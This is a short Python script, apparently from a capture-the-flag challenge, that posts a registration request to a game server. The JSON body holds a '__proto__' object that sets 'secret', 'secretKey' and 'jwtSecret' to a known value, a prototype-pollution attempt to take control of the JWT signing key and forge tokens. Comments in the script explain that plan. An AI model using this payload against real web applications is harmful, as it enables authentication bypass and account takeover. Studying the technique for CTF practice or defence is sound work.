import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# the notes query uses the user's ID from the JWT token.
# is the JWT token verified with a secret we can pollute?
# let's try to pollute `secret`, `secretKey`, etc.
url_reg = "http://exp.cybergame.sk:7021/api/v2/register"
payload = {
    "username": "admin2003",
    "password": "password",
    "__proto__": {
        "secret": "mysecret",
        "secretKey": "mysecret",
        "jwtSecret": "mysecret"
    }
}
r = requests.post(url_reg, json=payload, headers=headers)
print("Reg:", r.text)
